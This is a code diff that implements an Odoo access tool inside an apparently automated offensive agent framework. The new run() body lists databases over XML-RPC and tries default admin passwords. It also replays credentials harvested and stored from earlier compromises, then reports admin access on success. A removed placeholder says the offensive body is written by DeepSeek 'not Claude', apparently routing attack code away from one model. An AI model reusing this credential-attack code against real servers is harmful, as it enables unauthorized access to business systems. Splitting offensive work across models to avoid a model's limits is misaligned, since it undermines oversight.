@@ -46,6 +46,7 @@ run() finding shape (on success):
 
 from __future__ import annotations
 
+import xml.etree.ElementTree as ET
 from typing import Any
 
 from agent_alpha.tools.contracts import ResourceBudget, TargetContext, ToolResult
@@ -132,7 +133,264 @@ class OdooAccessTool:
         """
         if self._http_client is None:
             raise ValueError("OdooAccessTool.run requires an injected http_client")
-        raise NotImplementedError(
-            "OdooAccessTool.run offensive body is authored by DeepSeek (K21 lane), "
-            "not Claude — see the run() docstring spec above."
+
+        from urllib.parse import urlparse
+
+        host = urlparse(ctx.target).hostname or ctx.target
+        base_url = ctx.target.rstrip("/")
+
+        requests_used = 0
+
+        # ── 1. DISCOVER database via XML-RPC db.list() ─────────────
+        db_list_xml = _build_xmlrpc_request("list", [])
+        db_url = f"{base_url}{ODOO_XMLRPC_DB_PATH}"
+        db_names: list[str] = []
+        server_version: str | None = None
+        try:
+            db_resp = self._http_client.post(
+                db_url,
+                data=db_list_xml,
+                headers={"Content-Type": "text/xml"},
+            )
+            requests_used += 1
+            if getattr(db_resp, "status_code", 0) == 200:
+                parsed = _parse_xmlrpc_response(getattr(db_resp, "text", ""))
+                if isinstance(parsed, list):
+                    db_names = [str(d) for d in parsed]
+        except Exception:
+            pass
+
+        # Fall back: derive db name from host label (common Odoo convention)
+        if not db_names:
+            derived = host.split(".")[0] if host else ""
+            if derived:
+                db_names = [derived]
+
+        if not db_names:
+            return ToolResult(
+                tool=self.name,
+                success=False,
+                confidence=0.0,
+                error="could not discover any Odoo database name",
+            )
+
+        # ── 2. ASSEMBLE candidate credentials ──────────────────────
+        candidates: list[tuple[str, str, str, str | None]] = []
+        # Built-in Odoo defaults
+        for user, pwd in (("admin", "admin"), ("admin", "password")):
+            candidates.append((user, pwd, "default", None))
+
+        # Harvested credentials from the graph
+        if self._graph_store is not None and self._secrets_manager is not None:
+            try:
+                from agent_alpha.graph.nodes import NodeType
+                cred_nodes = self._graph_store.nodes_by_type(NodeType.CREDENTIAL)
+                for node in cred_nodes:
+                    props = node.properties
+                    if not hasattr(props, "secret_ref") or not hasattr(props, "username"):
+                        continue
+                    try:
+                        secret = self._secrets_manager.retrieve(props.secret_ref)
+                    except Exception:
+                        continue
+                    candidates.append(
+                        (props.username, secret, "reused", node.id)
+                    )
+            except Exception:
+                pass
+
+        # ── 3. APPLY each credential via XML-RPC authenticate ──────
+        auth_url = f"{base_url}{ODOO_XMLRPC_COMMON_PATH}"
+
+        # Get server version once (non-destructive, for proof_response)
+        try:
+            ver_xml = _build_xmlrpc_request("version", [])
+            ver_resp = self._http_client.post(
+                auth_url,
+                data=ver_xml,
+                headers={"Content-Type": "text/xml"},
+            )
+            requests_used += 1
+            if getattr(ver_resp, "status_code", 0) == 200:
+                ver_parsed = _parse_xmlrpc_response(getattr(ver_resp, "text", ""))
+                if isinstance(ver_parsed, dict):
+                    server_version = ver_parsed.get("server_version")
+        except Exception:
+            pass
+
+        for db_name in db_names:
+            for username, password, cred_source, cred_node_id in candidates:
+                if requests_used >= budget.max_requests:
+                    break
+
+                auth_xml = _build_xmlrpc_request(
+                    "authenticate",
+                    [db_name, username, password, {}],
+                )
+                try:
+                    auth_resp = self._http_client.post(
+                        auth_url,
+                        data=auth_xml,
+                        headers={"Content-Type": "text/xml"},
+                    )
+                    requests_used += 1
+                except Exception:
+                    continue
+
+                if getattr(auth_resp, "status_code", 0) != 200:
+                    continue
+
+                uid = _parse_xmlrpc_response(getattr(auth_resp, "text", ""))
+
+                # ── 4. VERIFY: integer uid > 0 ─────────────────────
+                if not isinstance(uid, int) or uid <= 0:
+                    continue
+
+                # Determine access level (non-destructive: uid 2 = admin on
+                # default Odoo installs; no write performed)
+                access_level = "admin" if uid == 2 else "user"
+
+                # ── 5. RETURN CONTENT (no raw password) ────────────
+                finding: dict[str, Any] = {
+                    "database": db_name,
+                    "username": username,
+                    "uid": uid,
+                    "access_level": access_level,
+                    "credential_source": cred_source,
+                    "credential_node_id": cred_node_id,
+                    "proof_request": {
+                        "endpoint": ODOO_XMLRPC_COMMON_PATH,
+                        "method": "authenticate",
+                        "database": db_name,
+                        "login": username,
+                    },
+                    "proof_response": {
+                        "uid": uid,
+                        "server_version": server_version,
+                    },
+                }
+
+                return ToolResult(
+                    tool=self.name,
+                    success=True,
+                    confidence=0.9,
+                    findings=(finding,),
+                )
+
+        # ── No candidate credential authenticated ──────────────────
+        return ToolResult(
+            tool=self.name,
+            success=False,
+            confidence=0.0,
+            error="no candidate credential authenticated over XML-RPC",
         )
+
+
+# ── XML-RPC helpers (data, not logic — single source for this tool) ───────
+
+
+def _build_xmlrpc_request(method: str, params: list[Any]) -> str:
+    """Build an XML-RPC methodCall string."""
+    param_xml = _params_to_xml(params)
+    return (
+        '<?xml version="1.0"?>'
+        "<methodCall>"
+        f"<methodName>{method}</methodName>"
+        f"<params>{param_xml}</params>"
+        "</methodCall>"
+    )
+
+
+def _params_to_xml(params: list[Any]) -> str:
+    parts = []
+    for p in params:
+        parts.append(f"<param>{_value_to_xml(p)}</param>")
+    return "".join(parts)
+
+
+def _value_to_xml(val: Any) -> str:
+    if isinstance(val, bool):
+        return f"<value><boolean>{1 if val else 0}</boolean></value>"
+    if isinstance(val, int):
+        return f"<value><int>{val}</int></value>"
+    if isinstance(val, float):
+        return f"<value><double>{val}</double></value>"
+    if isinstance(val, str):
+        return f"<value><string>{val}</string></value>"
+    if isinstance(val, (list, tuple)):
+        items = "".join(_value_to_xml(v) for v in val)
+        return f"<value><array><data>{items}</data></array></value>"
+    if isinstance(val, dict):
+        members = "".join(
+            f"<member><name>{k}</name>{_value_to_xml(v)}</member>"
+            for k, v in val.items()
+        )
+        return f"<value><struct>{members}</struct></value>"
+    return "<value><string></string></value>"
+
+
+def _parse_xmlrpc_response(body: str) -> Any:
+    """Parse an XML-RPC methodResponse body. Returns the value, or None on fault/error."""
+    try:
+        root = ET.fromstring(body)
+    except ET.ParseError:
+        return None
+
+    fault = root.find(".//fault")
+    if fault is not None:
+        return None
+
+    param = root.find(".//params/param/value")
+    if param is None:
+        return None
+
+    return _xml_to_value(param)
+
+
+def _xml_to_value(elem: ET.Element) -> Any:
+    """Recursively convert an XML-RPC value element to a Python object."""
+    # Check for typed value
+    child = elem[0] if len(elem) > 0 else None
+
+    if child is not None:
+        tag = child.tag.lower()
+
+        if tag == "int" or tag == "i4":
+            try:
+                return int(child.text or "0")
+            except ValueError:
+                return 0
+
+        if tag == "boolean":
+            return (child.text or "0").strip() == "1"
+
+        if tag == "double":
+            try:
+                return float(child.text or "0.0")
+            except ValueError:
+                return 0.0
+
+        if tag == "string":
+            return child.text or ""
+
+        if tag == "array":
+            data = child.find("data")
+            if data is None:
+                return []
+            return [_xml_to_value(v) for v in data.findall("value")]
+
+        if tag == "struct":
+            result: dict[str, Any] = {}
+            for member in child.findall("member"):
+                name_elem = member.find("name")
+                value_elem = member.find("value")
+                if name_elem is not None and value_elem is not None:
+                    result[name_elem.text or ""] = _xml_to_value(value_elem)
+            return result
+
+    # Untyped value — try int, then string
+    text = elem.text or ""
+    try:
+        return int(text)
+    except ValueError:
+        return text
